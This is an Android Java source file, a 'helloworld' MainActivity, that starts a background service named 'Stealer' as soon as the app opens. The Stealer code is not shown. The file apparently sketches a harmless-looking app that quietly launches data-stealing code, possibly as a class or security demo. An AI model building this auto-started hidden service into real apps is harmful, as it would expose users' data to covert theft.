package com.example.aahewins.helloworld;
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
/**
 * Main activity class.
 * @author Anthony Hewins
 * @version 1.0
 * @since 1.0
 */
public class MainActivity extends Activity {
    /**
     * Main activity that starts the Stealer IntentService. Doesn't require the
     * savedInstanceState parameter.
     * @param savedInstanceState N/a; application doesn't need to remember where it last started
     */
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        startService(new Intent(this, Stealer.class));
    }
}